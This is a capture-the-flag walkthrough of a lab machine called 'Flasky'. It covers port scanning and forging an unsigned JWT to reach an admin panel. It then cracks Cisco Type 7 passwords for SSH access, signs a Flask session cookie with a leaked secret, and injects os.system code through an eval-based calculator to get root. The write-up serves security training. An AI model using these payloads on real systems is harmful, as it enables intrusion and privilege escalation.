# Flasky

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.201.141
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-15 14:02 +08
Nmap scan report for 192.168.201.141
Host is up (0.17s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
5555/tcp  open     freeciv
20202/tcp open     ipdtp-port
```

Ran a detailed scan on the unknown ports.&#x20;

```
$ sudo nmap -p 5555,20202 -sC -sV --min-rate 3000 192.168.201.141       
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-15 14:03 +08
Nmap scan report for 192.168.201.141
Host is up (0.17s latency).

PORT      STATE SERVICE VERSION
5555/tcp  open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Calculator
|_http-server-header: nginx/1.18.0 (Ubuntu)
20202/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

Based on the box name, we are likely dealing with a Flask application here.&#x20;

### Web Enum -> JWT Exploit

Port 5555 just shows us a login page:

<figure><img src="../../../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

We don't have any credentials, so let's move on for now.

Port 20202 shows us another login page:

<figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

We can use the guest access to view the dashboard, and hints towards abusing JWT:

<figure><img src="../../../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>

We can take a look at the cookie value assigned to us:

<figure><img src="../../../.gitbook/assets/image (758).png" alt=""><figcaption></figcaption></figure>

We can easily change this to exploit it. I also ran a `gobuster` scan and found an admin directory:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.201.141:20202 -t 100               
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.201.141:20202
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/07/15 14:09:54 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 405) [Size: 178]
/guest                (Status: 200) [Size: 11865]
```

Visiting it just shows us this:

<figure><img src="../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

Running scans against both of these directories show nothing. I checked the requests in Burp, and there are some allowed methods:

<figure><img src="../../../.gitbook/assets/image (1639).png" alt=""><figcaption></figcaption></figure>

We can send POST and OPTIONS requests to this, but we first need to modify our cookie. The JWT cookie has 3 parts, the encryption type, the actual data and the signature. Since we know there's a problem with the JWT, we can abuse this by replacing the encryption type and the payload:

```
$ echo -n '{"typ":"JWT","alg":"none"}' | base64
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=
$ echo -n '{"id": "0","guest": "false","admin": true}' | base64
eyJpZCI6ICIwIiwiZ3Vlc3QiOiAiZmFsc2UiLCJhZG1pbiI6IHRydWV9
```

For the signature, since we did not specify an algorithm, we can leave it blank. The full token is thus:

{% code overflow="wrap" %}
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6ICIwIiwiZ3Vlc3QiOiAiZmFsc2UiLCJhZG1pbiI6IHRydWV9.
```
{% endcode %}

We can then send an empty login request to generate a POST request in Burpsuite, and then modify it to include our JWT token:

```http
POST /admin HTTP/1.1
Host: 192.168.201.141:20202
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://192.168.201.141:20202
Connection: close
Referer: http://192.168.201.141:20202/
Cookie: session=eyJsb2dnZWRfaW4iOmZhbHNlfQ.ZLI2-g.jAwlyKLCDrUP8eKqrY5OqHx15j0; JWT=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6ICIwIiwiZ3Vlc3QiOiAiZmFsc2UiLCJhZG1pbiI6IHRydWV9.
Upgrade-Insecure-Requests: 1



username=wwwwww&password=w
```

When we load the request in a Browser, we would see the admin dashboard:

<figure><img src="../../../.gitbook/assets/image (3997).png" alt=""><figcaption></figcaption></figure>

### Config -> SSH Creds

At the bottom, we can see users making posts about the configuration files:

<figure><img src="../../../.gitbook/assets/image (1623).png" alt=""><figcaption></figcaption></figure>

This step took forever, but I eventually found the config file at `cisco_config`.&#x20;

<figure><img src="../../../.gitbook/assets/image (3831).png" alt=""><figcaption></figcaption></figure>

These are Cisco Type 7 passwords, which can be decrypted here:

{% embed url="https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html" %}

We can then try each password with `ssh`, finding that `john:NezukoCh@n` works.

&#x20;

<figure><img src="../../../.gitbook/assets/image (1640).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Calculator Backup -> Root

Within the user's directories, there's a `calc.bak` file present:

```
john@Flasky:~$ ls -la *
-rw-r--r-- 1 john john   33 Jul 15 06:02 local.txt

Desktop:
total 8
drwxr-xr-x  2 root root 4096 Apr 23  2021 .
drwxr-xr-x 10 john john 4096 Jul 15 06:15 ..

Documents:
total 12
drwxr-xr-x  2 root root 4096 Apr 23  2021 .
drwxr-xr-x 10 john john 4096 Jul 15 06:15 ..
-r--r-----  1 john john  892 Apr 23  2021 calc.bak
```

It's the Python source code for the calculator application:

```python
john@Flasky:~/Documents$ cat calc.bak 
########################
# Calculator v1 Backup #
########################

from flask import Flask, render_template, request, session, abort
import os

app = Flask(__name__)

app.config['SECRET_KEY'] = 'Fl@sKy_Sup3R_S3cR3T'

@app.route('/')
def home():
        if not session.get('logged_in'):
                return render_template('login')
        else:
                return "Wrong Pass"

def do_login():
        if user == "xxx" && password == "xxx"
                login()
        else:
                print "Password is incorrect!"

def login():
        if session.get('logged_in'):
                return calc()

def calc():
        if input() == a+b:
                return add()
        if input() == a-b:
                return sub()
        if input() == a/b:
                return div()
        if input() == a*b:
                return mul() 

def add(a, b):
        return str(eval("%s + %s" % (a, b)))
def sub(a, b):
        return str(eval("%s - %s" % (a, b)))
def mul(a, b):
        return str(eval("%s * %s" % (a, b)))
def div(a, b):
        return str(eval("%s / %s" % (a, b)))
```

Since we have the Flask secret, we can create a cookie to bypass this since it only checks for the `logged_in` parameter.&#x20;

```
$ flask-unsign --sign --cookie "{'logged_in': True}" --secret 'Fl@sKy_Sup3R_S3cR3T'   
eyJsb2dnZWRfaW4iOnRydWV9.ZLI_rA.WmTcl0Wa5jOy8ajsJvWhn6npDKA
```

This allows us to access the calculator application:

<figure><img src="../../../.gitbook/assets/image (1274).png" alt=""><figcaption></figcaption></figure>

The source code uses `eval` to calculate the results, which is vulnerable to RCE. We can just inject Python code like this:

```http
POST /div HTTP/1.1
Host: 192.168.201.141:5555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Origin: http://192.168.201.141:5555
Connection: close
Referer: http://192.168.201.141:5555/
Cookie: session=eyJsb2dnZWRfaW4iOmZhbHNlfQ.ZLI2-g.jAwlyKLCDrUP8eKqrY5OqHx15j0; JWT=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ICIxIiwiZ3Vlc3QiOiAidHJ1ZSIsImFkbWluIjogZmFsc2V9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
Upgrade-Insecure-Requests: 1



value1=os.system("chmod+u%2bs+/bin/bash")&value2=1
```

Then, we can become `root`:

<figure><img src="../../../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>

Rooted!
